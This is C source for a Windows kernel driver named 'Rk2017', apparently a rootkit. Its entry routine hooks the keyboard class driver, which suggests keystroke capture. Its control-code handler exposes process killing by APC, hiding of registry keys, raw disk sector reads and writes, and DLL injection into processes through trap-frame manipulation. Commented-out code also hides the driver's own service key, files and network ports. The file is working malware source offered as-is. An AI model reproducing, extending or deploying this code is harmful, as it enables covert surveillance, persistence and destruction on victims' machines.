#include "rk.h"
#include "ApcKillProcess.h"
#include "DrvFunction.h"
#include "InitializeInjectRelevantInfo.h"
#include "Rk2017Hook.h"
#include "SystemPreInit.h"
#include "HideProcess.h"
#include "HideReg.h"
#include "Sector.h"
#include "KLog.h"
#include "DrvFileSystem.h"
#include "InjectKtrapFrame.h"

RK2017_RUNTIME_LIBRARY g_Rk2017RunTimeLibrary;

NTSTATUS Dispatch(PDEVICE_OBJECT pDevObj,PIRP pIrp);
NTSTATUS ReadDispatch(PDEVICE_OBJECT pDevObj,PIRP pIrp);
NTSTATUS DispatchIoCtl(PDEVICE_OBJECT pDevObj,PIRP pIrp);

#ifdef SHUTDOWN_PROTECT
NTSTATUS DispatchShutdown(PDEVICE_OBJECT pDevObj,PIRP pIrp);
#endif

#ifdef _DEBUG

void DrvUnLoad(PDRIVER_OBJECT pDrvObj)
{
	UNICODE_STRING UniSymName;

	if (g_Rk2017RunTimeLibrary.UniRegPath.Buffer)
	{
		ExFreePool(g_Rk2017RunTimeLibrary.UniRegPath.Buffer);
		g_Rk2017RunTimeLibrary.UniRegPath.Buffer = NULL;
	}
	IoUnregisterShutdownNotification(pDrvObj->DeviceObject);
	PsSetCreateProcessNotifyRoutine(CreateProcessRoutine,TRUE);
	if (pDrvObj->DeviceObject)
	{
		RtlInitUnicodeString(&UniSymName,RK2017_LINKNAME);
		IoDeleteSymbolicLink(&UniSymName);
		IoDeleteDevice(pDrvObj->DeviceObject);
	}
	return;
}

#endif
NTSTATUS SetDrvStartType(ULONG ulStartType,PWCHAR pDrvName)
{
	NTSTATUS Status;
	HANDLE hDrvKey;
	UNICODE_STRING UniKeyPath;
	UNICODE_STRING UniSubKey;
	OBJECT_ATTRIBUTES ObjectAttributes;
	WCHAR wDrvKey[MAX_PATH];
	ULONG ulNeedSize;
	PKEY_VALUE_PARTIAL_INFORMATION pKeyValuePartialInfo;

	Status = STATUS_SUCCESS;
	hDrvKey = NULL;
	ulNeedSize = 0;
	pKeyValuePartialInfo = NULL;
	RtlZeroMemory(wDrvKey,sizeof(WCHAR) * MAX_PATH);
	StringCchPrintfW(wDrvKey,MAX_PATH, \
		L"\\registry\\machine\\system\\currentcontrolset\\services\\%ws", \
		pDrvName);
	RtlInitUnicodeString(&UniKeyPath,wDrvKey);
	InitializeObjectAttributes(&ObjectAttributes,&UniKeyPath,OBJ_CASE_INSENSITIVE,NULL,0);
	Status = ZwOpenKey(&hDrvKey,KEY_ALL_ACCESS,&ObjectAttributes);
	if (NT_SUCCESS(Status))
	{
		RtlInitUnicodeString(&UniSubKey,L"Start");
		Status = ZwQueryValueKey(hDrvKey,&UniSubKey,KeyValuePartialInformation,NULL,0,&ulNeedSize);
		if (NT_ERROR(Status) && Status == STATUS_BUFFER_TOO_SMALL)
		{
			do 
			{
				pKeyValuePartialInfo = ExAllocatePool(NonPagedPool,ulNeedSize);
			} while (NULL == pKeyValuePartialInfo);
			RtlZeroMemory(pKeyValuePartialInfo,ulNeedSize);
			Status = ZwQueryValueKey(hDrvKey,&UniSubKey,KeyValuePartialInformation,pKeyValuePartialInfo,ulNeedSize,&ulNeedSize);
			if (NT_SUCCESS(Status))
			{
				if (pKeyValuePartialInfo->Type == REG_DWORD)
				{
					if (*(ULONG*)pKeyValuePartialInfo->Data != ulStartType)
					{
						Status = ZwSetValueKey(hDrvKey,&UniSubKey,0,REG_DWORD,&ulStartType,sizeof(ULONG));
						if (NT_SUCCESS(Status))
						{
							if (pKeyValuePartialInfo)
							{
								ExFreePool(pKeyValuePartialInfo);
								pKeyValuePartialInfo = NULL;
							}
							ZwClose(hDrvKey);
							return Status;
						}
					}
				}
			}
		}
	}
	if (pKeyValuePartialInfo)
	{
		ExFreePool(pKeyValuePartialInfo);
		pKeyValuePartialInfo = NULL;
	}
	if (hDrvKey)
	{
		ZwClose(hDrvKey);
	}
	return Status;
}
NTSTATUS DriverEntry(PDRIVER_OBJECT pDrvObj,PUNICODE_STRING pUniRegistry)
{
	NTSTATUS Status;
	UNICODE_STRING UniDevName;
	UNICODE_STRING UniSymName;
	UNICODE_STRING UniDrvName;
	ANSI_STRING AnsiDrvName;
	PDEVICE_OBJECT pDevObj;
	PWCHAR pwQuote;
	WCHAR wTempPath[MAX_PATH];
	//WCHAR HideDrvFileNameW[MAX_PATH];
	//WCHAR HideDrvKeyNameW[MAX_PATH];

	do 
	{
		if (*NtBuildNumber < 2600)
		{
			Status = STATUS_NOT_SUPPORTED;
			break;
		}
		RtlZeroMemory(&g_Rk2017RunTimeLibrary,sizeof(RK2017_RUNTIME_LIBRARY));

		g_Rk2017RunTimeLibrary.pDriverObject = pDrvObj;

		g_Rk2017RunTimeLibrary.UniRegPath.MaximumLength = pUniRegistry->Length + sizeof(UNICODE_NULL);
		g_Rk2017RunTimeLibrary.UniRegPath.Buffer = (PWSTR)ExAllocatePool(NonPagedPool, \
			g_Rk2017RunTimeLibrary.UniRegPath.MaximumLength);
		if (NULL != g_Rk2017RunTimeLibrary.UniRegPath.Buffer)
		{
			RtlCopyUnicodeString(&g_Rk2017RunTimeLibrary.UniRegPath,pUniRegistry);
			RtlZeroMemory(wTempPath,MAX_PATH * sizeof(WCHAR));
			if(pUniRegistry->Length < MAX_PATH * sizeof(WCHAR))
			{
				RtlCopyMemory(wTempPath,pUniRegistry->Buffer, pUniRegistry->Length);
				_wcslwr(wTempPath);
				pwQuote = wcsrchr(wTempPath,L'\\');
				if(pwQuote)
				{			
					pwQuote++;
					RtlInitUnicodeString(&UniDrvName,pwQuote);
					RtlCopyMemory(g_Rk2017RunTimeLibrary.wDrvName,UniDrvName.Buffer,UniDrvName.Length);
					_wcslwr(g_Rk2017RunTimeLibrary.wDrvName);
					RtlUnicodeStringToAnsiString(&AnsiDrvName,&UniDrvName,TRUE);
					RtlCopyMemory(g_Rk2017RunTimeLibrary.DrvName,AnsiDrvName.Buffer,AnsiDrvName.Length);
					_strlwr(g_Rk2017RunTimeLibrary.DrvName);
					RtlFreeAnsiString(&AnsiDrvName);
				}
			}
		}
		else
		{
			g_Rk2017RunTimeLibrary.UniRegPath.MaximumLength = 0;
			g_Rk2017RunTimeLibrary.UniRegPath.Length = 0;
		}

		g_Rk2017RunTimeLibrary.ulSafeMode = *InitSafeBootMode;
		RtlInitUnicodeString(&UniDevName,RK2017_DEVNAME);
		RtlInitUnicodeString(&UniSymName,RK2017_LINKNAME);

		Status = IoCreateDevice(pDrvObj, \
			(ULONG)NULL, \
			&UniDevName, \
			FILE_DEVICE_UNKNOWN, \
			0, \
			FALSE, \
			&pDevObj);
		if (NT_ERROR(Status))
		{
			break;
		}
		
		g_Rk2017RunTimeLibrary.pDeviceObject = pDevObj;

		Status = IoCreateSymbolicLink(&UniSymName,&UniDevName);
		if (NT_ERROR(Status))
		{
			IoDeleteDevice(pDevObj);
			break;
		}

		pDrvObj->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)Dispatch;
		pDrvObj->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)Dispatch;
		pDrvObj->MajorFunction[IRP_MJ_READ] = (PDRIVER_DISPATCH)Dispatch;
		pDrvObj->MajorFunction[IRP_MJ_WRITE] = (PDRIVER_DISPATCH)Dispatch;
#ifdef SHUTDOWN_PROTECT
		pDrvObj->MajorFunction[IRP_MJ_SHUTDOWN] = DispatchShutdown;
		Status = IoRegisterShutdownNotification(pDevObj);
		if (NT_ERROR(Status))
		{
			KdPrint(("IoRegisterShutdownNotification Failde~~~\r\n"));
		}
#endif
		pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)DispatchIoCtl;
#ifdef _DEBUG
		pDrvObj->DriverUnload = DrvUnLoad;
#endif

		InitializeInjectInformation(&g_InjectRelevantOffset);
		//InitializeHideProcessList();
		//InitWhiteProcNameListAndLock();
		//InitializeHideKeyList();

		g_Rk2017RunTimeLibrary.pSystemProcess = IoGetCurrentProcess();
		//RtlZeroMemory(HideDrvFileNameW,sizeof(WCHAR) * MAX_PATH);
		//StringCchPrintfW(HideDrvFileNameW,MAX_PATH,L"%ws.sys",g_Rk2017RunTimeLibrary.wDrvName);
		//AddNameToWhiteNameList(HideDrvFileNameW);

		HookKbdClass(TRUE);
		//Status = SetDrvStartType(SERVICE_SYSTEM_START,g_Rk2017RunTimeLibrary.wDrvName);
		//if (NT_ERROR(Status))
		//{

		//}

		//InitializeHidePort();
		//InstallTcpDriverHook();

		//RtlZeroMemory(HideDrvKeyNameW,sizeof(WCHAR) * MAX_PATH);
		//StringCchPrintfW(HideDrvKeyNameW, \
		//	MAX_PATH, \
		//	L"\\registry\\machine\\system\\currentcontrolset\\services\\%ws", \
		//	g_Rk2017RunTimeLibrary.wDrvName);
		//Status = CmHideKey(HideDrvKeyNameW);

		CheckFileSystem(pDrvObj);
		//if (g_InjectRelevantOffset.WindowsVersion.bIsWindows2000 != TRUE && \
		//	g_InjectRelevantOffset.WindowsVersion.bIsWindows2003 != TRUE && \
		//	g_InjectRelevantOffset.WindowsVersion.bIsWindowsXp != TRUE)
		//{
		//	RegisterFltHideFile(pDrvObj);
		//}

	} while (0);
	if (NT_ERROR(Status))
	{
		if (pDrvObj->DeviceObject)
		{
			RtlInitUnicodeString(&UniSymName,RK2017_LINKNAME);
			IoDeleteSymbolicLink(&UniSymName);
			IoDeleteDevice(pDrvObj->DeviceObject);
		}
	}
	return Status;
}
NTSTATUS Dispatch(PDEVICE_OBJECT pDevObj,PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp,IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
NTSTATUS ReadDispatch(PDEVICE_OBJECT pDevObj,PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp,IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
NTSTATUS DispatchIoCtl(PDEVICE_OBJECT pDevObj,PIRP pIrp)
{
	NTSTATUS Status;
	PIO_STACK_LOCATION pIrpStack;
	PUCHAR pInBuffer,pOutBuffer;
	ULONG ulInLength,ulOutLength,ulIoCtlCode,ulInfo;

	Status = STATUS_INVALID_PARAMETER;
	ulInfo = 0;

	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	ulInLength = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
	pInBuffer = pIrp->AssociatedIrp.SystemBuffer;
	ulOutLength = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;
	pOutBuffer = pIrp->AssociatedIrp.SystemBuffer;
	ulIoCtlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;

	switch(ulIoCtlCode)
	{
	case IOC(RkKillProcess):
		{
			IOP(RkKillProcess) *Param;

			if (sizeof(*Param) == ulInLength)
			{
				Param = (IOP(RkKillProcess) *)pIrp->AssociatedIrp.SystemBuffer;
				if (Param->hKillPId)
				{
					Status = KillProcessByApc(Param->hKillPId);
				}
				else
				{
					Status = KillProcessByApc((HANDLE)GetProcessId(Param->ProcessName));
				}
			}
		}
		break;
	case IOC(RkHideRegister):
		{
			IOP(RkHideRegister) *Param;

			if (sizeof(*Param) == ulInLength)
			{
				Param = (IOP(RkHideRegister) *)pIrp->AssociatedIrp.SystemBuffer;
				if (Param->bIsAddHide)
				{
					if (Param->RegisterPath[0] != '\0')
					{
						Status = CmHideKey(Param->RegisterPath);
					}
				}
				else
				{

				}
			}
		}
		break;
	case IOC(WriteSector):
		{
			IOP(WriteSector) *Param;

			if (sizeof(*Param) > ulInLength && ulOutLength < sizeof(*Param))
			{
				break;
			}
			Param = (IOP(WriteSector) *)pIrp->AssociatedIrp.SystemBuffer;
			Status = ReadSector(Param->ulDiskIndex, \
				Param->ulSectorSize, \
				Param->ulStartSector, \
				Param->OrgSector, \
				Param->ulLength);
			Status = WriteSector(Param->ulDiskIndex, \
				Param->ulSectorSize, \
				Param->ulStartSector, \
				Param->NewSector, \
				Param->ulLength);
			ulInfo = sizeof(*Param);
		}
		break;
	case IOC(ReadSector):
		{
			IOP(ReadSector) *Param;

			if (sizeof(*Param) > ulInLength && ulOutLength < sizeof(*Param))
			{
				break;
			}
			Param = (IOP(ReadSector) *)pIrp->AssociatedIrp.SystemBuffer;
			Status = ReadSector(Param->ulDiskIndex, \
				Param->ulSectorSize, \
				Param->ulStartSector, \
				Param->NewSector, \
				Param->ulLength);
			RtlCopyMemory(Param->OrgSector,Param->NewSector,Param->ulLength);
			ulInfo = Param->ulLength;
		}
		break;
	case IOC(InjectKtrapFrame):
		{
			IOP(InjectKtrapFrame) *Param;
			PINJECT_PROCESS_INFORMATION pInjectProcessInfo;

			if (ulInLength < sizeof(*Param))
			{
				break;
			}
			Param = (IOP(InjectKtrapFrame) *)pIrp->AssociatedIrp.SystemBuffer;
			//inject_ktrap_frame(params->pInjectProcessName,NULL,params->pInjectDllPath);
			//g_bIsInjectKtrapFrame = TRUE;
			do 
			{
				pInjectProcessInfo = ExAllocatePoolWithTag(NonPagedPool,sizeof(INJECT_PROCESS_INFORMATION) + MAX_PATH,'PasP');
			} while (NULL == pInjectProcessInfo);
			RtlZeroMemory(pInjectProcessInfo,sizeof(INJECT_PROCESS_INFORMATION) + MAX_PATH);

			Param = (IOP(InjectKtrapFrame) *)pIrp->AssociatedIrp.SystemBuffer;
			if (Param->ulPid)
			{
				pInjectProcessInfo->ulPid = Param->ulPid;
			}
			else
			{
				RtlCopyMemory(pInjectProcessInfo->pInjectProcessName,Param->pInjectProcessName,strlen(Param->pInjectProcessName));
			}
#ifndef _WIN64
			Status = InjectKtrapFrame(pInjectProcessInfo,Param->pInjectDllPath);
			if (pInjectProcessInfo)
			{
				ExFreePoolWithTag(pInjectProcessInfo,'PasP');
			}
#else
			if (pInjectProcessInfo)
			{
				ExFreePoolWithTag(pInjectProcessInfo,'PasP');
			}
#endif
		}
		break;
	default:
		Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	pIrp->IoStatus.Status = Status;
	pIrp->IoStatus.Information = ulInfo;
	IoCompleteRequest(pIrp,IO_NO_INCREMENT);
	return Status;
}
#ifdef SHUTDOWN_PROTECT
NTSTATUS DispatchShutdown(PDEVICE_OBJECT pDevObj,PIRP pIrp)
{

	//PIO_STACK_LOCATION Stack;
	NTSTATUS Status;

	Status = STATUS_SUCCESS;

	//Status = SetDrvStartType(SERVICE_SYSTEM_START,g_Rk2017RunTimeLibrary.wDrvName);
	//if (NT_ERROR(Status))
	//{

	//}
	//Stack = IoGetCurrentIrpStackLocation(pIrp);
	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIrp,IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
#endif